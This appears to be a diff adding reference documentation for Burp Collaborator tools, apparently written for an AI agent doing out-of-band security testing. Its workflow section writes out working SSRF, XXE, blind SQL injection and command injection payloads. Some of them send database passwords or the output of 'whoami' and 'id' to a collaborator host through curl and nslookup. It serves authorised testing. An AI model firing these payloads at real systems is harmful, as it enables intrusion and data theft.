@@ -1,0 +1,78 @@
+=== Burp Collaborator (Out-of-Band Testing) ===
+
+Burp Collaborator provides unique subdomains that report back DNS, HTTP, and SMTP
+interactions. Essential for confirming blind vulnerabilities. Requires Burp Professional.
+
+--- TOOLS ---
+
+  collaborator_generate_payload
+    Returns: payload URL + clientId for polling
+    No required parameters.
+
+  collaborator_generate_payload_with_data(customData)
+    customData: String  Max 16 alphanumeric chars for correlation
+    Returns: payload URL + clientId
+    Example: collaborator_generate_payload_with_data(customData="sqli01")
+
+  collaborator_poll_interactions(clientId)
+    clientId: String    From generate_payload result
+    Returns: interaction type (DNS/HTTP/SMTP), timestamp, details
+
+  collaborator_get_secret_key(clientId)
+    Save key to resume polling later.
+
+  collaborator_restore_client(secretKey)
+    Resume polling with saved secret key.
+
+  collaborator_list_clients
+    See all active Collaborator clients.
+
+  collaborator_status
+    Check if Collaborator is available.
+
+--- WORKFLOW ---
+
+  1. Generate payload:
+     payload = collaborator_generate_payload()
+     -> Returns: abc123.oastify.com + clientId
+
+  2. Inject into target:
+
+     SSRF:
+       content="GET /fetch?url=http://PAYLOAD/callback HTTP/1.1\nHost: target.com\n\n"
+
+     XXE:
+       content="POST /api/parse HTTP/1.1\nHost: target.com\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://PAYLOAD\">]><foo>&xxe;</foo>"
+
+     Blind SQLi (MySQL):
+       ' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.PAYLOAD\\a'))--
+
+     Blind SQLi (Oracle):
+       ' UNION SELECT UTL_HTTP.REQUEST('http://PAYLOAD/'||(SELECT password FROM users WHERE rownum=1)) FROM dual--
+
+     Blind SQLi (MSSQL):
+       '; EXEC master..xp_dirtree '\\PAYLOAD\share'--
+
+     Command Injection:
+       ; nslookup $(whoami).PAYLOAD
+       ; curl http://PAYLOAD/$(id)
+
+     Email header injection:
+       test@PAYLOAD
+
+  3. Poll for interactions:
+     collaborator_poll_interactions(clientId=CLIENT_ID)
+     -> DNS: query type (A, AAAA, MX), queried subdomain
+     -> HTTP: method, path, headers, body
+     -> SMTP: email details
+
+  4. Correlate:
+     If using customData, match interaction.customData to identify source injection point.
+
+--- PERSISTENCE ---
+
+  Save for later:
+    key = collaborator_get_secret_key(clientId=CLIENT_ID)
+
+  Resume in new session:
+    collaborator_restore_client(secretKey=KEY)
